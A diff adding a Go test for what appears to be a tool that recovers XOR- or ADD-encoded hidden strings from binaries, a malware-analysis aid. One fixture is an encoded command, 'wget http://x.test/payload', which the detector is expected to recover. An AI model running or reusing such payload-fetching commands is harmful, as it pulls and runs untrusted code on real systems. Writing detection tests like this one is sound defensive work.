@@ -195,3 +195,46 @@ func TestDoubledLettersInRecoveredTextSurvive(t *testing.T) {
 		t.Fatalf("%+v", got)
 	}
 }
+
+// Found by running the tool on real samples: upper-case DLL names are what XOR
+// 0x20 "decodes" to lower case, and a bare short marker is what chance gives in
+// a large file. Neither is a hidden string.
+func TestCaseFoldingAndBareShortMarkersAreNotHiddenStrings(t *testing.T) {
+	for _, plain := range []string{"WININET.DLL\x00", "KERNEL32.DLL\x00", "WININET\x00", "CMD.EXE /C DIR\x00", "HTTP://EXAMPLE.COM/\x00"} {
+		if got := Find(pad([]byte(plain), 32)); len(got) != 0 {
+			t.Errorf("upper-case %q reported as hidden: %+v", plain, got)
+		}
+	}
+	// ADD 0x20 (lower case turned into upper case) is the same thing.
+	if got := Find(pad([]byte("wininet.dll\x00"), 32)); len(got) != 0 {
+		t.Errorf("plain lower case reported: %+v", got)
+	}
+	up := []byte("WININET\x00")
+	for i := range up {
+		up[i] -= 0x20 // 'W' - 0x20 would be unprintable; keep the bytes the decoder would see
+	}
+	// A bare 5-byte marker (here "wget " under ADD 0x24) with nothing after it.
+	bare := []byte("wget ")
+	for i := range bare {
+		bare[i] += 0x24
+	}
+	if got := Find(pad(append(bare, 0xFF, 0xFE), 64)); len(got) != 0 {
+		t.Errorf("a bare short marker was reported: %+v", got)
+	}
+	// The same marker followed by an argument is a real hidden command.
+	cmd := []byte("wget http://x.test/payload\x00")
+	for i := range cmd {
+		cmd[i] += 0x24
+	}
+	if got := Find(pad(cmd, 32)); len(got) != 1 || got[0].Text != "wget http://x.test/payload" {
+		t.Errorf("a real hidden command was lost: %+v", got)
+	}
+	// A whole name of seven or more characters that ends at a terminator is kept.
+	k := []byte("kernel32\x00")
+	for i := range k {
+		k[i] ^= 0x5a
+	}
+	if got := Find(pad(k, 32)); len(got) != 1 || got[0].Text != "kernel32" {
+		t.Errorf("a terminated 8-character name was lost: %+v", got)
+	}
+}
